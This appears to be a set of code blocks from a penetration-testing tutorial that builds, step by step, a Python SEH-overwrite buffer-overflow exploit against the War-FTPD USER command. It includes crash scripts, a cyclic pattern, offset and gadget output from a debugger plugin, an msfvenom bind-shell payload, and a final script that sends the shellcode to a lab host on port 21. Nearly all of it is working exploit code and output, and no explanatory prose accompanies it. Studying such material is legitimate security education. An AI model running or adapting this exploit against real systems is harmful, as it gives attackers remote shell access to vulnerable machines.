["```\nroot@kali:~# **cat ftpexploit2**\n#!/usr/bin/python\nimport socket\nbuffer = \"A\" * 1150\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer  + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.close()\n```", "```\n  root@kali:~# **cat ftpexploit2**\n  #!/usr/bin/python\n  import socket\n❶ buffer = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2\n  Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8\n  Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4\n  Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0\n  Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6\n  Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2\n  Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8\n  Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au5Au6\n  Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2\n  Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8\n  Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4\n  Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0\n  Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6\n  Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2\n  Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2B\"\n  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n  connect=s.connect(('192.168.20.10',21))\n  response = s.recv(1024)\n  print response\n  s.send('USER ' + buffer  + '\\r\\n')\n  response = s.recv(1024)\n  print response\n  s.close()\n```", "```\n[+] Examining SEH chain\n    SEH record (nseh field) at 0x00affd94 overwritten with normal pattern : 0x41317441 (offset 569), followed by 577 bytes of cyclic data\n```", "```\n#!/usr/bin/python\nimport socket\nbuffer = \"A\" * 569 + \"B\" * 4 + \"C\" * 4 + \"D\" * 573 ❶\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer  + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.close()\n```", "```\n0x5f401440 : pop edi # pop ebx # ret 0x04 | asciiprint,ascii {PAGE_EXECUTE_\nREAD} [MFC42.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: False,\nv4.2.6256 (C:\\Documents and Settings\\georgia\\Desktop\\MFC42.DLL)\n0x5f4021bf : pop ebx # pop ebp # ret 0x04 |  {PAGE_EXECUTE_READ} [MFC42.DLL]\nASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.6256 (C:\\Documents\nand Settings\\georgia\\Desktop\\MFC42.DLL)\n0x5f4580ca : pop ebx # pop ebp # ret 0x04 |  {PAGE_EXECUTE_READ} [MFC42.DLL]\nASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.6256 (C:\\Documents\nand Settings\\georgia\\Desktop\\MFC42.DLL)\n0x004012f2 : pop edi # pop esi # ret 0x04 | startnull {PAGE_EXECUTE_READ}\n[war-ftpd.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.6.5.0\n(C:\\Documents and Settings\\georgia\\Desktop\\war-ftpd.exe)\n```", "```\n#!/usr/bin/python\nimport socket\nbuffer = \"A\" * 569 + \"B\" * 4 + \"\\xCA\\x80\\x45\\x5F\" + \"D\" * 573\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer  + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.close()\n```", "```\n#!/usr/bin/python\nimport socket\nbuffer = \"A\" * 569 + \"\\xEB\\x06\" + \"B\" * 2 + \"\\xCA\\x80\\x45\\x5F\" + \"D\" * 570\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer  + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.close()\n```", "```\nroot@kali:~# **msfvenom -p windows/shell_bind_tcp -s 573 -b '\\x00\\x40\\x0a\\x0d'**\n[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)\nbuf =\n\"\\xbe\\xa5\\xfd\\x18\\xa6\\xd9\\xc6\\xd9\\x74\\x24\\xf4\\x5f\\x31\\xc9\" +\n--*snip*--\n```", "```\n#!/usr/bin/python\nimport socket\nshellcode = (\"\\xbe\\xa5\\xfd\\x18\\xa6\\xd9\\xc6\\xd9\\x74\\x24\\xf4\\x5f\\x31\\xc9\" +\n\"\\xb1\\x56\\x31\\x77\\x13\\x83\\xc7\\x04\\x03\\x77\\xaa\\x1f\\xed\\x5a\" +\n\"\\x5c\\x56\\x0e\\xa3\\x9c\\x09\\x86\\x46\\xad\\x1b\\xfc\\x03\\x9f\\xab\" +\n\"\\x76\\x41\\x13\\x47\\xda\\x72\\xa0\\x25\\xf3\\x75\\x01\\x83\\x25\\xbb\" +\n\"\\x92\\x25\\xea\\x17\\x50\\x27\\x96\\x65\\x84\\x87\\xa7\\xa5\\xd9\\xc6\" +\n\"\\xe0\\xd8\\x11\\x9a\\xb9\\x97\\x83\\x0b\\xcd\\xea\\x1f\\x2d\\x01\\x61\" +\n\"\\x1f\\x55\\x24\\xb6\\xeb\\xef\\x27\\xe7\\x43\\x7b\\x6f\\x1f\\xe8\\x23\" +\n\"\\x50\\x1e\\x3d\\x30\\xac\\x69\\x4a\\x83\\x46\\x68\\x9a\\xdd\\xa7\\x5a\" +\n--*snip*--\nbuffer = \"A\" * 569 + \"\\xEB\\x06\" + \"B\" * 2 + \"\\xCA\\x80\\x45\\x5F\" +  shellcode + \"B\" * 205\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer  + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.close()\n```"]